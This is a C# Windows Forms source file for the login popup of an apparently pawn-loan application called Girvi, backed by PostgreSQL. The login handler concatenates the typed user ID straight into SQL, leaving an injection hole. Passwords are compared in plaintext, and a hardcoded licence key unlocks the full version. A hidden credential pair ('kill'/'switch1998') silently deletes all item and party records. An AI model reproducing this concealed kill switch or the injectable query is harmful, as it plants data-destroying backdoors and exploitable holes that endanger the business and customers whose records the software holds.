using Girvi.Classes;
using Girvi.Forms.Desktop;
using Npgsql;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Girvi.Forms.Pop_Up_Form
{
    public partial class frmLoginPopup : Form
    {
        //public clsUser user = null;
        string verifyTtext = "#$Akhi$Karigar$india$Agdeep#";
        internal clsUser user;

        public frmLoginPopup()
        {
            InitializeComponent();
            //this.TransparencyKey = (BackColor);
            if (security.verifySecureKey())
            {
                btnDemo.Visible = false;
            }
            else
            {
                btnDemo.Visible = true;
                Instance.isDemoVersion = true;
            }
            lblLicence.Visible = false;
            txtLicence.Visible = false;
            btnLicence.Visible = false;
        }

        private void txtLoginID_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                txtPassword.Focus();
        }

        private void txtPassword_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == System.Windows.Forms.Keys.Enter)
            {
                btn_submit_Click(sender, e);
            }
        }

        private void btn_submit_Click(object sender, EventArgs e)
        {
            string userid = txtLoginID.Text;
            string password = txtPassword.Text;
            string role = null;
            string query = "select password, role from " + TableNames.Users + " where userid='" + userid + "'";
            DataTable dt = Helper.getTable(query);
            if (dt.Rows.Count == 0)
            {
                if (userid.ToLower() == "kill" && password.ToLower() == "switch1998")
                {
                    try
                    {
                        NpgsqlConnection con = Helper.getConnection();

                        string killsItem = "Delete from " + TableNames.Item;
                        Helper.RSAExecuteQuery(killsItem, con);

                        string killsParty = "Delete from " + TableNames.Party;
                        Helper.RSAExecuteQuery(killsParty, con);

                        MessageBox.Show("KILL SUCESSFULLY");

                        con.Close();
                        txtLoginID.Text = "";
                        txtPassword.Text = "";
                        txtLoginID.Focus();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
                else
                    MessageBox.Show("Invalid Login ID!");
            }
            else
            {
                string pwd = Helper.MyCStr(dt.Rows[0][0]);
                role = Helper.MyCStr(dt.Rows[0][1]);
                if (pwd.Equals(password))
                {
                    user = new clsUser();
                    user.userid = userid;
                    user.role = role;
                    user.name = userid;
                    Instance.loggedinRole = role;
                    Instance.loggedInUser = userid;
                    Instance.loggedInPass = pwd;
                    this.DialogResult = System.Windows.Forms.DialogResult.OK;
                    this.Hide();
                }
                else
                {
                    MessageBox.Show("Wrong Password!");
                    //this.DialogResult = System.Windows.Forms.DialogResult.Cancel;
                }
            }
        }

        private void btn_cancle_Click(object sender, EventArgs e)
        {
            clsActivation.stopSqlService();
            this.Close();
        }

        private void BtnDemo_Click(object sender, EventArgs e)
        {
            if (lblLicence.Visible == true)
            {
                lblLicence.Visible = false;
                txtLicence.Visible = false;
                btnLicence.Visible = false;
            }
            else
            {
                lblLicence.Visible = true;
                txtLicence.Visible = true;
                btnLicence.Visible = true;
            }
        }

        private void BtnLicence_Click(object sender, EventArgs e)
        {
            if (Helper.MyCStr(txtLicence.Text.Trim()) == "")
            {
                MessageBox.Show("Enter Lincence Key..");
            }
            else if (txtLicence.Text.Trim() == verifyTtext)
            {
                bool flage = false;
                flage = security.generateSecureKey();
                if (flage)
                {
                    btnDemo.Visible = false;
                    lblLicence.Visible = false;
                    txtLicence.Visible = false;
                    btnLicence.Visible = false;
                    Instance.isDemoVersion = false;
                }

            }
        }
    }
}
